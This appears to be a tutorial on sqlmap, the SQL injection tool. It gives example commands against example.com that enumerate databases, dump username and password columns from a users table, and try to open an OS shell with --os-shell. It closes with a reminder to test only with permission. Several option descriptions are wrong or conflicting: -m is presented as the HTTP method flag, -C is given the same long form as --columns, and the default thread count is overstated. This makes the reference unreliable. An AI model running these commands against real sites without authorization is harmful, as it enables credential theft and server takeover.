# A Comprehensive Guide

sqlmap is a powerful, open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities in web applications. It's designed to be highly customizable and feature-rich, supporting a wide range of database management systems (DBMS) and injection techniques. This document provides an in-depth overview of sqlmap's core functionalities, arguments, and practical applications.

## sqlmap Basics

*   **Target Specification:** sqlmap targets web application endpoints that interact with databases, often through URL parameters or form inputs.
*   **Vulnerability Detection:** It automatically detects SQL injection vulnerabilities using various techniques.
*   **Exploitation:** Once a vulnerability is found, sqlmap can exploit it to retrieve data, modify database content, and even gain control of the server in some cases.
*   **Database Support:** sqlmap supports most popular databases, including MySQL, PostgreSQL, Oracle, Microsoft SQL Server, SQLite, and more.

## Core sqlmap Arguments and Options

Here's a breakdown of some of the most important arguments and options in sqlmap:

1.  **`-u <url>` / `--url=<url>`:** Specifies the target URL. This is the primary option for targeting web application endpoints.
    *   **Example:** `sqlmap -u "http://example.com/product.php?id=1"`

2.  **`--data=<data>`:** Specifies POST data, use this with the option `-m POST`
    *   **Example:** `sqlmap -u "http://example.com/login.php" --data="username=test&password=test"`

3.  **`-H <header>` / `--header=<header>`:** Allows you to specify custom headers to include with the HTTP request. You can specify multiple headers.
    *   **Example:** `sqlmap -u "http://example.com/api/user" -H "X-API-Key: your_key"`

4. **`-p <parameter>` / `--param=<parameter>`:** Specifies the parameter to target for SQL injection. Use this if `sqlmap` is not able to identify automatically.
  * **Example:** `sqlmap -u "http://example.com/product.php?id=1&category=books" -p id`

5.  **`--cookie=<cookie>`:** Specifies cookie to use with the request.
    *   **Example:** `sqlmap -u "http://example.com/secure.php" --cookie="sessionid=1234"`

6. **`-m <method>` / `--method=<method>`:** Choose between the methods `GET` or `POST`.
     * **Example:** `sqlmap -u "http://example.com/submit.php" -m POST --data="user=test"`

7.  **`--dbs`:** Enumerate databases. Use this with an injectable target to get the database names
   *   **Example:** `sqlmap -u "http://example.com/product.php?id=1" --dbs`

8. **`-D <db>` / `--db=<db>`:** Specifies the database to target. Use this with an injectable target to get information from a specific database.
   *   **Example:** `sqlmap -u "http://example.com/product.php?id=1" -D "users_db" --tables`

9.  **`--tables`:** Enumerate database tables. Requires the `-D` flag.
    *   **Example:** `sqlmap -u "http://example.com/product.php?id=1" -D "users_db" --tables`

10. **`-T <table>` / `--table=<table>`:** Specifies the table to target. Requires both the `-D` and `--tables` flags.
    *   **Example:** `sqlmap -u "http://example.com/product.php?id=1" -D "users_db" -T "users" --columns`

11. **`--columns`:** Enumerate database columns. Requires the `-D` and `-T` flags.
   *    **Example:** `sqlmap -u "http://example.com/product.php?id=1" -D "users_db" -T "users" --columns`

12.  **`-C <columns>` / `--columns=<columns>`:** Specifies columns to dump data from. Requires `-D` and `-T` flags and also `--dump`.
    *   **Example:** `sqlmap -u "http://example.com/product.php?id=1" -D "users_db" -T "users" -C "username,password" --dump`

13. **`--dump`:** Dumps all data from table. Requires `-D`, `-T`, and `-C` or it will dump all columns.
   *  **Example:** `sqlmap -u "http://example.com/product.php?id=1" -D "users_db" -T "users" -C "username,password" --dump`

14. **`-b` / `--banner`:** Obtain the banner of a database.
    *  **Example:** `sqlmap -u "http://example.com/product.php?id=1" -b`

15.  **`--os-shell`:** Attempts to gain an operating system shell (if possible).
    *  **Example:** `sqlmap -u "http://example.com/product.php?id=1" --os-shell`

16. **`--level=<level>`:** Level of test to perform, ranging from 1 to 5 (default 1). Level 5 includes all options of levels 1-4, plus the heaviest injection techniques.
    *  **Example:** `sqlmap -u "http://example.com/product.php?id=1" --level=3`

17. **`--risk=<risk>`:** Risk value that defines how aggressive sqlmap should be, ranging from 1 to 3 (default is 1)
    *  **Example:** `sqlmap -u "http://example.com/product.php?id=1" --risk=2`

18. **`--threads=<threads>`:** Specify the number of threads to use during scan, default is 10.
     *   **Example:** `sqlmap -u "http://example.com/product.php?id=1" --threads=20`

19. **`-v <level>` / `--verbose=<level>`:** Level of verbosity. Can be used from 1 to 5. Default is 1.
    *   **Example:** `sqlmap -u "http://example.com/product.php?id=1" -v 3`

## Practical sqlmap Examples

1.  **Basic SQL injection test:**
    ```bash
    sqlmap -u "http://example.com/product.php?id=1"
    ```

2.  **POST request with SQL injection test:**
    ```bash
    sqlmap -u "http://example.com/login.php" --data="username=test&password=test"
    ```

3.  **Enumerate databases:**
    ```bash
    sqlmap -u "http://example.com/product.php?id=1" --dbs
    ```

4.  **Enumerate tables in a database and specific columns:**

    ```bash
    sqlmap -u "http://example.com/product.php?id=1" -D "users_db" --tables -T "users" --columns
    ```

5.  **Dump data from a specific column in a table:**
    ```bash
    sqlmap -u "http://example.com/product.php?id=1" -D "users_db" -T "users" -C "username,password" --dump
    ```
6. **Obtain database banner:**
  ```bash
    sqlmap -u "http://example.com/product.php?id=1" -b
  ```
7. **Attempt to get an OS shell:**
    ```bash
    sqlmap -u "http://example.com/product.php?id=1" --os-shell
    ```
8. **Use custom header for sql injection:**
    ```bash
    sqlmap -u "http://example.com/api/user" -H "X-API-Key: your_key" --dbs
    ```

## Use Cases

*   **Web Application Penetration Testing:** Identifying and exploiting SQL injection vulnerabilities during security assessments.
*   **Vulnerability Research:** Testing web application endpoints for potential SQL injection vulnerabilities.
*   **Data Breach Simulation:** Simulate data breaches using SQL injection to extract sensitive information.
*   **Security Training:** Learning and practicing SQL injection exploitation techniques.
*   **Automated Security Testing:** Integrating into CI/CD pipelines for continuous vulnerability scanning.

## Conclusion

sqlmap is a highly effective and versatile tool for discovering and exploiting SQL injection vulnerabilities. Its extensive features and options make it essential for security professionals and penetration testers. Remember to always use security tools responsibly and ethically, and only against systems you have permission to test.

---